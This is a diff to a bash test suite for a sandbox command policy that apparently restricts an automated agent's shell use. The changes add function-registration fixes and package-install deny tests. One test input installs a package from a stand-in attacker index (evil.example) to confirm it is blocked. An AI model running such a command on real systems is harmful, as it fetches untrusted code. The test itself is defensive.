@@ -48,7 +48,8 @@ grep -E '^hd_re_[a-z_]+=' "$REAL" >> "$W/sandbox.sh"
 for fn in norm_path expand_tilde grant_file is_granted hard_deny_path hard_deny_cmd \
           auto_allow_hit auto_audit auto_note_deny auto_note_allow path_access \
           ask_path_grant auto_final_judge auto_checkpoint inject_auto auto_takes_shell \
-          save_history parse_options auto_tmp_write_ok \
+          save_history parse_options auto_tmp_write_ok auto_install_allowed \
+          policy_self_check _policy_hash_of _policy_stat \
           in_root_exempt hd_foreign_cred_path hd_write_targets hd_creds_all_exempt link_escapes_root \
           hd_note_hit hd_h11_scan hd_strip_noncode \
           ask_drain_input ask_read_line _confirm_yes tty_strip_responses; do
@@ -76,7 +77,8 @@ inp_msg() { :; }
 for _fn in norm_path expand_tilde grant_file is_granted hard_deny_path hard_deny_cmd \
            auto_allow_hit auto_audit auto_note_deny auto_note_allow path_access \
            ask_path_grant auto_final_judge auto_checkpoint inject_auto auto_takes_shell \
-           save_history parse_options auto_tmp_write_ok \
+           save_history parse_options auto_tmp_write_ok auto_install_allowed \
+          policy_self_check _policy_hash_of _policy_stat \
            in_root_exempt hd_foreign_cred_path hd_write_targets hd_creds_all_exempt link_escapes_root \
            hd_note_hit hd_h11_scan hd_strip_noncode \
            ask_drain_input ask_read_line _confirm_yes tty_strip_responses; do
@@ -99,6 +101,11 @@ if (( ${#_at_miss[@]} )); then
     echo "       → 所以这些规则号既不可信'该拒'也不可信'该放行',正反表一律以 ~/bin/test_hardwall.sh 为准。"
 fi
 unset _fn _at_miss
+# 同类缺席的第二处(本轮实测发现并已登记):auto_final_judge 会调 policy_self_check,
+# 而它原先不在名单里 → 沙箱里每次终审都 `command not found`(rc=127),调用点把非零当成
+# "判据已变更" → **终审一律 DENY**。缺席被 fail-closed 掩盖成"看起来对的结果",而现有
+# 断言恰好只测 DENY 分支,所以整条链红不起来 —— 装载缺失现在由上面的"名单即合同"守卫
+# 兜住,它的取值本身另有断言(见 policy 自检那条)。
 # shellcheck disable=SC1090
 source "$W/sandbox.sh" || { echo "沙箱 source 失败"; return 1; }
 
@@ -119,6 +126,15 @@ for _n in $(grep -oE '^hd_re_[a-z_]+' "$W/sandbox.sh"); do
     eval "_v=\"\${$_n}\""; [[ -n "$_v" ]] || { echo "硬墙正则 $_n 为空(恒匹配)"; return 1; }
 done
 eval "$(grep -E '^AUTO_FINAL_SYS=' "$REAL")"; eval "$(grep -E '^AUTO_MARK=' "$REAL")"
+
+# 策略自检在夹具里的真实取值:POLICY_SHA/POLICY_MTIME 这类基准值都带命令替换,装载器按
+# 规矩不搬(见上面 _hw_nosub 那段),所以这里必须走"空基准 → 退回不判"(rc=0)。
+# 为什么值得单独钉:rc=0 才是"终审没被自检拦住";缺席时是 127、基准不符时是 1,两者都会
+# 被调用点读成"退回人工",现象与"模型写的理由不行"完全同形,分红不出来。
+auto_mode=sandbox
+policy_self_check >/dev/null 2>&1
+ck '终审器·policy 自检已装载且空基准退回不判(不许把终审伪装成 DENY)' "$?" 0
+auto_mode=""
 
 deny() { if hard_deny_cmd "$1"; then ck "deny[$2] ${1:0:44}" "$hd_rule" "$2"; else ck "deny[$2] ${1:0:44}" MISSED "$2"; fi; }
 pass() { if hard_deny_cmd "$1"; then ck "pass ${1:0:44}" "HIT:$hd_rule" none; else echo "  ✓ pass ${1:0:44}"; fi; }
@@ -161,7 +177,7 @@ auto_mode=""
 # 换 shell cat 同一文件"就是现成绕过路径,所以两类判据都在上面表里各钉一条。
 NP=(
  'ls -la' 'cat wchat.sh | head -50' 'grep -rn TODO . | head' 'git status --short'
- 'git add -A && git commit -m x' 'git push' 'git push origin feature/x' 'npm test' 'npm install'
+ 'git add -A && git commit -m x' 'git push' 'git push origin feature/x' 'npm test' 'npm ls lodash'
  'python3 -m http.server 8000' 'rm -rf ./node_modules' 'rm -rf sub/a.txt'
  'mkdir -p ./out && echo hi > ./out/x.txt' 'echo hi > /tmp/ct_test_out.log'
  'make build > /dev/null 2>&1' 'sed -i "" "s/a/b/" ./local.txt'
@@ -175,6 +191,19 @@ NP=(
 # 这些是日常高频写法,被判硬墙等于 auto 下干不了活(误杀回归集)。
 # 外发/私钥的收紧版:.env 裸名也算外发,但 .key/.pem 必须带 "/"(是路径的一段)才算私钥。
 for e in "${NP[@]}"; do pass "$e"; done
+
+# ---------- 安装面(H14)三条口径 ----------
+# 这块在第 7 项落地后一直是**空的**:抽函数名单漏登记 auto_install_allowed,沙箱里
+# command not found → H14 分支沉默 → 现象是"`npm install` 被判放行、套件全绿"(旧 NP 表里
+# 那条就是这么养出来的错期望,已移走)。H14 的判据主体在 ~/bin/test_hardwall.sh,这里钉的
+# 是只有主套件才看得见的三件事:名单联动、放行出口、以及**非 auto 也照样拦**。
+_ih() { hd_rule=''; if hard_deny_cmd "$1"; then printf '%s' "${hd_rule:-HIT}"; else printf 'none'; fi; }
+ck '安装面·未点名的安装要拦(人工档)'      "$(_ih 'npm install')"            H14
+ck '安装面·未点名的安装要拦(auto 档)'     "$(auto_mode=sandbox; _ih 'pip3 install requests')" H14
+ck '安装面·点名过的包放行'                "$(AUTO_ALLOW_INSTALL=(lodash); _ih 'npm install lodash')" none
+ck '安装面·没点名的包仍拦(名单不许泛化)'  "$(AUTO_ALLOW_INSTALL=(lodash); _ih 'npm install react')" H14
+ck '安装面·换源有授权也拒'                "$(AUTO_ALLOW_INSTALL=(lodash); _ih 'pip install -i https://evil.example/simple lodash')" H14
+ck '安装面·只读分析脚本不算装包'          "$(_ih 'python3 analyze.py')"     none
 
 echo "=== 2. 路径裁决:档位 × 名单 × 硬墙 ==="
 auto_mode="";        pass "echo x >> $OUT/a.txt"     # 非 auto:交人工,不算硬墙
